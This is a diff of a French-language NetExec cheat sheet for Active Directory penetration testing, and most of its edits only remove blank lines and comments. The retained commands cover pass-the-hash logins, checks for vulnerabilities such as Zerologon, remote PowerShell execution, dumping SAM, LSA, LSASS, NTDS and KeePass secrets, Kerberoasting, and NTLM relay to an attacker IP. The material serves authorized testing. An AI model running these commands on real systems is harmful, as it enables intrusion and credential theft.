@@ -26,7 +26,7 @@
 
   
 
-### <0xF0><0x9F><0x97><0x84>️ **Authentification**
+### **Authentification**
 
   
 
@@ -75,11 +75,8 @@ netexec <proto> <cible> -u <utilisateur> -H <hash_ntlm | lm:ntlm> [-d <domaine>]
   
 
 ```bash
-
 export KRB5CCNAME=/chemin/vers/ticket.ccache
-
 netexec <proto> <cible> -k [--use-kcache] [-d <domaine>]
-
 ```
 
   
@@ -99,11 +96,8 @@ netexec <proto> <cible> -k [--use-kcache] [-d <domaine>]
   
 
 ```bash
-
 netexec smb <cible> -u '' -p ''
-
 netexec ldap <cible> -u '' -p ''
-
 ```
 
   
@@ -117,9 +111,7 @@ netexec ldap <cible> -u '' -p ''
   
 
 ```bash
-
 netexec smb <cible> -u <utilisateur> -p <mot_de_passe> --local-auth
-
 ```
 
   
@@ -145,53 +137,27 @@ netexec smb <cible> -u <utilisateur> -p <mot_de_passe> --local-auth
   
 
 ```bash
-
 # Vérifier l'accès (authentification)
-
 netexec smb <cible> -u <user> -p <pass | -H hash> [-d domain]
 
-  
-
 # Lister les partages accessibles
-
 netexec smb <cible> -u <user> -p <pass | -H hash> --shares
 
-  
-
 # Lister les sessions actives (qui est connecté ?)
-
 netexec smb <cible> -u <user> -p <pass | -H hash> --sessions
 
-  
-
 # Lister les disques montés
-
 netexec smb <cible> -u <user> -p <pass | -H hash> --disks
 
-  
-
 # Lister les utilisateurs connectés (loggedon)
-
 netexec smb <cible> -u <user> -p <pass | -H hash> --loggedon-users
 
-# Prérequis: Droits admin local sur la cible
-
-  
-
 # Lister les utilisateurs et groupes locaux/domaine
-
 netexec smb <cible> -u <user> -p <pass | -H hash> --users
-
 netexec smb <cible> -u <user> -p <pass | -H hash> --groups
 
-  
-
 # Énumérer la politique de mot de passe du domaine
-
 netexec smb <cible> [-u <user> -p <pass | -H hash>] --pass-pol
-
-# Note: Peut parfois fonctionner en anonyme ou avec un compte standard.
-
 ```
 
   
@@ -209,39 +175,22 @@ netexec smb <cible> [-u <user> -p <pass | -H hash>] --pass-pol
 ```bash
 
 # Vérifier si SMB Signing est désactivé (vulnérable au relais NTLM)
-
 netexec smb <cible | subnet> --gen-relay-list smb_signing_off.txt
 
-  
-
 # Vérifier vulnérabilités spécifiques (exemples)
-
 netexec smb <cible> [-u '' -p ''] -M ms17-010 # EternalBlue/WannaCry
-
 netexec smb <cible> [-u '' -p ''] -M zerologon # Zerologon (CVE-2020-1472)
-
 netexec smb <cible> [-u '' -p ''] -M petitpotam # PetitPotam (Relais NTLM)
-
 netexec smb <cible> [-u '' -p ''] -M nopac # SAM Account Name Spoofing (CVE-2021-42278 & CVE-2021-42287)
 
-  
-
 # Vérifier si le service Spooler (Imprimante) est actif (vulnérable à PrintNightmare)
-
 netexec smb <cible> [-u <user> -p <pass | -H hash>] -M spooler
 
-  
-
 # Énumérer les GPOs appliquées
-
 netexec smb <cible> -u <user> -p <pass | -H hash> -M gpo
 
-  
-
 # Énumérer les ACLs intéressantes (qui a quels droits sur quoi)
-
 netexec smb <cible> -u <user> -p <pass | -H hash> -M acl
-
 ```
 
   
@@ -257,19 +206,11 @@ netexec smb <cible> -u <user> -p <pass | -H hash> -M acl
   
 
 ```bash
-
 # Exécuter une commande simple via différentes méthodes (SMBExec, WMIExec, ATExec...)
-
 netexec smb <cible> -u <user> -p <pass | -H hash> -x <commande>
-
-# Exemple: netexec smb DC01 -u admin -p P@ss -x "whoami /all"
-
   
-
 # Exécuter une commande PowerShell plus complexe
-
 netexec smb <cible> -u <user> -p <pass | -H hash> -X 'powershell -enc <base64_payload>'
-
 ```
 
   
@@ -291,33 +232,19 @@ netexec smb <cible> -u <user> -p <pass | -H hash> -X 'powershell -enc <base64_pa
 ```bash
 
 # Lister récursivement les fichiers/dossiers sur les partages accessibles
-
 netexec smb <cible> -u <user> -p <pass | -H hash> --spider [nom_partage]
-
-# Exemple: netexec smb FS01 -u user -p Pass --spider Confidential
-
   
-
 # Lister et potentiellement télécharger des fichiers intéressants (plus avancé)
-
 netexec smb <cible> -u <user> -p <pass | -H hash> -M spider_plus [-o READ_ONLY=false DEPTH=2]
-
 # -o READ_ONLY=false : Tente de télécharger les fichiers trouvés
-
 # -o DEPTH=X : Profondeur de la recherche
 
-  
 
 # Télécharger un fichier spécifique
-
 netexec smb <cible> -u <user> -p <pass | -H hash> --get-file '\\<PARTAGE>\<chemin>\fichier.txt' fichier_local.txt
 
-  
-
 # Uploader un fichier spécifique
-
 netexec smb <cible> -u <user> -p <pass | -H hash> --put-file fichier_local.txt '\\<PARTAGE>\<chemin>\fichier.txt'
-
 ```
 
   
@@ -341,53 +268,30 @@ netexec smb <cible> -u <user> -p <pass | -H hash> --put-file fichier_local.txt '
   
 
 ```bash
-
 # Dumper les hashes SAM locaux
-
 netexec smb <cible> -u <user> -p <pass | -H hash> --sam
 
-  
-
 # Dumper les secrets LSA locaux (peut contenir clés, mots de passe de service...)
-
 netexec smb <cible> -u <user> -p <pass | -H hash> --lsa
 
-  
-
 # Dumper la mémoire du processus LSASS (peut contenir mots de passe en clair, tickets...)
-
 netexec smb <cible> -u <user> -p <pass | -H hash> -M lsassy
 
-  
-
 # Dumper la base de données NTDS.dit (hashes de tous les comptes du domaine)
-
 netexec smb <DC_cible> -u <domain_admin> -p <pass | -H hash> --ntds [vss]
-
 # [vss] : Utilise Volume Shadow Copy pour une copie plus stable (recommandé)
-
 # Prérequis: Domain Admin sur un Contrôleur de Domaine.
 
-  
-
 # Dumper les clés DPAPI
-
 netexec smb <cible> -u <user> -p <pass | -H hash> --dpapi
 
-  
-
 # Dumper les mots de passe Wifi stockés
-
 netexec smb <cible> -u <user> -p <pass | -H hash> -M wireless
 
-  
-
 # Rechercher des fichiers Keepass et tenter d'extraire la masterkey
-
 netexec smb <cible> -u <user> -p <pass | -H hash> -M keepass_discover
 
 netexec smb <cible> -u <user> -p <pass | -H hash> -M keepass_trigger -o KEEPASS_CONFIG_PATH="<chemin_trouvé>"
-
 ```
 
   
@@ -415,29 +319,18 @@ netexec smb <cible> -u <user> -p <pass | -H hash> -M keepass_trigger -o KEEPASS_
   
 
 ```bash
-
 # Énumération de base (infos domaine, DC)
-
 netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>]
 
-  
-
 # Lister les utilisateurs (avec descriptions si disponibles)
-
 netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] --users
 
 netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] -M get-desc-users
 
-  
-
 # Lister les groupes
-
 netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] --groups
 
-  
-
 # Lister les ordinateurs
-
 netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] --computers
 
 ```
@@ -457,35 +350,22 @@ netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] --computers
 ```bash
 
 # AS-REP Roasting (Recherche/Exploitation des comptes sans pré-authentification)
-
 netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] --asreproast <fichier_hashes>
-
 # Note: Peut parfois fonctionner en anonyme si on fournit une liste d'utilisateurs (-u users.txt -p '')
 
-  
-
 # Kerberoasting (Recherche/Exploitation des comptes avec SPN)
-
 netexec ldap <DC_cible> -u <user> -p <pass | -H hash> --kerberoasting <fichier_hashes>
 
   
 
 # Énumérer les comptes avec délégation non contrainte (Unconstrained Delegation)
-
 netexec ldap <DC_cible> -u <user> -p <pass | -H hash> --trusted-to-auth
 
-  
-
 # Énumérer les ACLs intéressantes (peut révéler des chemins de PrivEsc)
-
 netexec ldap <DC_cible> -u <user> -p <pass | -H hash> -M acl [-o USER="<user_cible>"]
 
-  
-
 # Énumérer le quota de création de comptes machine (ms-DS-MachineAccountQuota)
-
 netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] -M maq
-
 ```
 
   
@@ -509,17 +389,11 @@ netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] -M maq
   
 
 ```bash
-
 # Vérifier l'accès WinRM
-
 netexec winrm <cible> -u <user> -p <pass | -H hash>
 
-  
-
 # Exécuter une commande via WinRM
-
 netexec winrm <cible> -u <user> -p <pass | -H hash> -X <commande>
-
 # Exemple: netexec winrm SRV01 -u admin -H <hash> -X 'Get-Process'
 
 ```
@@ -547,41 +421,25 @@ netexec winrm <cible> -u <user> -p <pass | -H hash> -X <commande>
   
 
 ```bash
-
 # Vérifier l'accès MSSQL (Authentification SQL ou Windows)
-
 netexec mssql <cible> -u <sql_user> -p <pass>
 
 netexec mssql <cible> -u <win_user> -p <pass | -H hash> --local-auth # Auth Windows locale
 
 netexec mssql <cible> -u <dom_user> -p <pass | -H hash> -d <domaine> # Auth Windows domaine
 
-  
-
 # Exécuter une requête SQL
-
 netexec mssql <cible> -u <user> -p <pass> -q "SELECT @@version;"
 
-  
-
 # Tenter d'activer et utiliser xp_cmdshell pour exécuter des commandes système
-
 netexec mssql <cible> -u <sa_user> -p <pass> -M xpcmdshell -o COMMAND="whoami"
-
 # Prérequis: Privilèges élevés sur MSSQL (ex: sysadmin).
 
-  
-
 # Énumérer les privilèges de l'utilisateur connecté
-
 netexec mssql <cible> -u <user> -p <pass> -M mssql_priv
 
-  
-
 # Tenter un relais NTLM via xp_dirtree (si l'utilisateur a les droits)
-
 # (Lancez Responder/ntlmrelayx avant)
-
 netexec mssql <cible> -u <user> -p <pass> -M ntlmrelay -o RHOST=<ip_attaquant>
 
 ```
@@ -603,21 +461,15 @@ netexec mssql <cible> -u <user> -p <pass> -M ntlmrelay -o RHOST=<ip_attaquant>
   
 
 ```bash
-
 # Vérifier si RDP est ouvert et si NLA est requis
-
 netexec rdp <cible>
 
-  
-
 # Tenter une connexion (vérifier les identifiants)
-
 netexec rdp <cible> -u <user> -p <pass | -H hash>
 
   
 
 # Prendre un screenshot de la session RDP (si une session est active)
-
 netexec rdp <cible> -u <user> -p <pass | -H hash> --screenshot screenshot.png [--screentime <secondes>]
 
 ```
